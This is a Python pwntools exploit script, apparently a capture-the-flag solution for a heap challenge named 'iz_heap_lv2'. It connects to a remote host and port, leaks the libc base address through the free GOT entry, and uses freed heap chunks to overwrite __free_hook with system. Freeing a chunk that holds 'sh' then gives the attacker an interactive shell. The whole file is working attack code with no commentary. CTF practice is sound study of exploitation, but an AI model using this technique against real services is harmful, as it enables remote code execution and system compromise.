from pwn import *

target = ELF('./iz_heap_lv2')
PTR_LIST = 0x602040
SIZE_LIST = 0x6020e0

libc = ELF('./libc.so.6')

def add(size, data):
	r.sendlineafter('Choice: \n', '1')
	r.sendlineafter('Enter size: ', str(size))
	r.sendafter('Enter data: ', data)

def delete(index):
	r.sendlineafter('Choice: \n', '3')
	r.sendlineafter('Enter index: ', str(index))

def show(index):
	r.sendlineafter('Choice: \n', '4')
	r.sendlineafter('Enter index: ', str(index))
	r.recvuntil('Data: ')
	return r.recvline()

r = remote('165.22.110.249', 4444)
# r = process('./iz_heap_lv2_patched')

add(target.got['free'], 'hoge')
LIBC_BASE = u64(show((SIZE_LIST - PTR_LIST) / 8)[:-1].ljust(8, '\x00')) - libc.symbols['free']
log.info('LIBC_BASE: {:#x}'.format(LIBC_BASE))

add(0x21, 'hoge')
add(SIZE_LIST + 0x10, 'hoge')
add(SIZE_LIST + 0x10, 'hoge')

delete((SIZE_LIST - PTR_LIST) / 8 + 2)
delete((SIZE_LIST - PTR_LIST) / 8 + 3)

add(0x18, p64(LIBC_BASE + libc.symbols['__free_hook']))
add(0x18, 'sh\x00')
add(0x18, p64(LIBC_BASE + libc.symbols['system']))

delete(5)

r.interactive()
